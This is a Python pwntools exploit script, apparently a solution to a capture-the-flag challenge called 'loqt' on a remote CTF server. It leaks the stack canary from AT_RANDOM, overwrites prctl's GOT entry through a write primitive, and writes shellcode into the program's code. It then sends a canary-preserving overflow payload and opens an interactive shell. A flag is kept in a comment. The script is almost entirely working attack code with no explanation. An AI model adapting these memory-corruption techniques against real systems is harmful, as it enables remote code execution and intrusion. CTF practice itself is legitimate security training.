#!/usr/bin/env python3
import struct

from pwn import *

def main():
    # with process(["./loqt"]) as tube:
    with remote("loqt.play.hfsc.tf", 10808) as tube:
        for _ in range(8):
            tube.recvline()
        at_random = bytes.fromhex(tube.recvline().decode())
        print(at_random.hex())
        cookie, = struct.unpack("<Q", at_random[:8])
        cookie &= 0xffffffffffffff00
        print(hex(cookie))
        tube.sendlineafter(b"> ", b"write")
        tube.sendafter(b"addr:", b"0x403F90w")  # prctl@got
        tube.sendafter(b"data:", struct.pack("<Q", 0x4018A8))  # child

        with open("shellcode.bin", "rb") as fp:
            shellcode = fp.read()
        while len(shellcode) % 8 != 0:
            shellcode += b"\x00"
        scratch = 0x401DA8  # main
        for i in range(0, len(shellcode), 8):
            tube.sendlineafter(b"> ", b"rite")
            tube.sendafter(b"addr:", hex(scratch + i).encode() + b"w")
            tube.sendafter(b"data:", shellcode[i:i+8])

        tube.sendlineafter(b"> ", b"rite")
        tube.sendafter(b"addr:", b"0x403F90w")  # prctl@got
        tube.sendafter(b"data:", struct.pack("<Q", 0x401C13))  # read@child

        data = flat({}, length=0x1000)
        cookie_off = data.index(b"caaadaaa")
        rop_off = data.index(b"gaaahaaa")
        data = flat({
            cookie_off: struct.pack("<Q", cookie),
            rop_off: b"".join((
                struct.pack("<Q", scratch),
            )),
        }, length=0x1000)
        tube.send(data)
        tube.interactive()
        # midnight{meh_fuck_it_you_know}

if __name__ == "__main__":
    main()
